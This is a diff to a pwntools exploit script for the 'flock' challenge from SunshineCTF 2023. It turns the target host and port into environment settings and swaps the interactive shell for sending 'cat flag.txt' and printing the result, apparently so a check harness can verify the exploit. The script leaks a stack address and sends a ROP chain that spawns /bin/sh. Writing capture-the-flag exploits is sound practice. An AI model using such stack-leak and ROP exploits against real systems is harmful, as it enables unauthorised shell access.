@@ -1,6 +1,7 @@
 from pwn import *
+import os
 
-binary = "flock"
+binary = ".build/flock" if os.path.exists(".build/flock") else "flock"
 
 # context.terminal = ["tmux", "splitw", "-h"]
 e = context.binary = ELF(binary)
@@ -10,9 +11,10 @@ continue
 '''
 
 def start():
-    #return remote('127.0.0.1', 23002)
-    return remote('chal.2023.sunshinectf.games', 23002)
-    
+    host = os.environ.get('HOST', '127.0.0.1')
+    port = int(os.environ.get('PORT', 23002))
+    return remote(host, port)
+
     # if args.GDB:
     #     return gdb.debug(e.path, gdbscript=gs)
     # elif args.REMOTE:
@@ -45,4 +47,11 @@ addr = leak_stack_addr()
 chain = ret_chain(addr)
 
 p.sendline(chain)
-p.interactive()
+
+# win() pops a shell (system("/bin/sh")); print the flag instead of going
+# interactive so `pwnmake check` can verify it. Give the shell a moment to come
+# up before sending the command so it isn't swallowed by the ROP read.
+time.sleep(0.5)
+p.sendline(b'cat flag.txt')
+time.sleep(0.5)
+print(p.recvrepeat(2.0).decode(errors='replace'))
